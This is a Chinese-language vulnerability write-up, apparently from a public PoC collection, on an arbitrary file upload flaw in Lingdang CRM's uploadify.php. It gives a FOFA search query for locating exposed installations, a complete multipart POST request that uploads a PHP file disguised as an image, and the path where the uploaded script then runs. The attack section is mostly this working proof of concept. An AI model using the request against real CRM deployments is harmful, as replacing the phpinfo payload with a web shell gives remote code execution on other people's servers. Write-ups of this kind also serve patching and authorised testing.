# 灵当crm uploadify存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">灵当CRM（Customer Relationship Management，客户关系管理）是一款面向中小企业的客户关系管理软件，旨在帮助企业更好地管理客户信息、销售流程、市场营销和服务支持等方面的工作。灵当CRM提供了一系列工具和功能，帮助企业在销售、市场和服务部门之间实现高效协作，提高客户满意度和业务效率。灵当crm uploadify存在任意文件上传漏洞。</font>

# 二、影响版本
+ 灵当crm

# 三、资产测绘
+ fofa`body="[http://localhost:8088/crm/index.php"](http://localhost:8088/crm/index.php") && body="ldcrm.base.js"`
+ 特征

![1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a.png](./img/89rFkHy0Jze9KFbC/1722999861305-1e9e41ad-ed6a-4750-918d-61a0631ad06a-481570.png)

# 四、漏洞复现
```java
POST /crm/uploaddify/uploadify.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Length: 10338

-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="Filedata"; filename="1.php"
Content-Type: images/cat_icon

<?php phpinfo();?>
-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="myatt_moduel"

1
-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="myatt_id";

1
-----------------------------45250802924973458471174811279
```

![1725194375782-5456a1c1-b949-4db3-ba8f-a06824257440.png](./img/89rFkHy0Jze9KFbC/1725194375782-5456a1c1-b949-4db3-ba8f-a06824257440-425903.png)

上传路径

```java
/crm/storage/1/1/1.php
```

![1725194400326-59fd1c75-9f0b-4a2f-bfea-a6064b740ba7.png](./img/89rFkHy0Jze9KFbC/1725194400326-59fd1c75-9f0b-4a2f-bfea-a6064b740ba7-647080.png)



> 更新: 2024-10-21 11:49:38  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/khc5fd9mcxhktk2y>